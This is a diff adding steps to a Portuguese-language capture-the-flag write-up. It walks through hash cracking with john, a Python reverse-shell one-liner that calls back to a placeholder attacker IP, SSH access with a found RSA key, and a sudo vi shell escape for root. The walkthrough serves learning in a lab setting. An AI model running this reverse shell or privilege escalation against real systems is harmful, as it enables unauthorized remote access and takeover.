@@ -48,6 +48,39 @@ john hash --wordlist=rockyou.txt
 * ### Usando o Login e Senha encontrados, conseguimos logar e encontramos um campo e botão para executar comandos.
 ![image](https://github.com/lufffe/Writeups/assets/90646635/4526d6ec-a87e-4050-8ddf-d975adda8053)
 
+* ### Coloca o Netcat para ficar ouvindo em uma porta e usa a Sheel Reversa, e essa que eu usei.
+> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("SEU_IP",PORTA));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 
+![image](https://github.com/lufffe/Writeups/assets/90646635/263625d5-ef5d-4245-930c-61263029d2ee)
+
+* ### No Home tem um usuário Charlie, a flag está lá mais não temos permissão de leitura, mas tem um arquivo chamado teleport, que é uma chave RSA.
+![image](https://github.com/lufffe/Writeups/assets/90646635/01cbc011-a810-45df-918f-e8b9f7db15df)
+
+* ### Dando permissão a chave RSA, e fazendo acesso por SSH.
+![image](https://github.com/lufffe/Writeups/assets/90646635/2f8466bc-aebe-4382-9ebb-38cb5af1b1eb)
+
+* ### Flag Usuário.
+```bash
+cat user.txt
+```
+
+* ### Buscando um ponto para escalar previlégio do Usuário.
+```bash
+sudo -l
+```
+![image](https://github.com/lufffe/Writeups/assets/90646635/dff322d5-5448-496c-adca-c3b764e87c2c)
+
+* ### GTFobins.
+![image](https://github.com/lufffe/Writeups/assets/90646635/56ff433d-0cf3-4490-81c8-5949cf2ac7bb)
+```bash
+sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
+```
+![image](https://github.com/lufffe/Writeups/assets/90646635/e457b5d9-115d-4c87-a0f2-62250e89caf4)
+
+* ### Tentei buscar direto o /root/root.txt, mas o arquivo não existia, dps de ver tem um arquivo root.py, depois de testar algumas coisas lembrei da chave que tinha encontrado lá no inicio.
+![image](https://github.com/lufffe/Writeups/assets/90646635/69fad255-ef8d-470e-8901-dfba9a8799b2)
+
+* ### E então descobri a flag Root.
+![image](https://github.com/lufffe/Writeups/assets/90646635/48b41b99-539a-42d1-8977-d29870bfedc9)
 
 
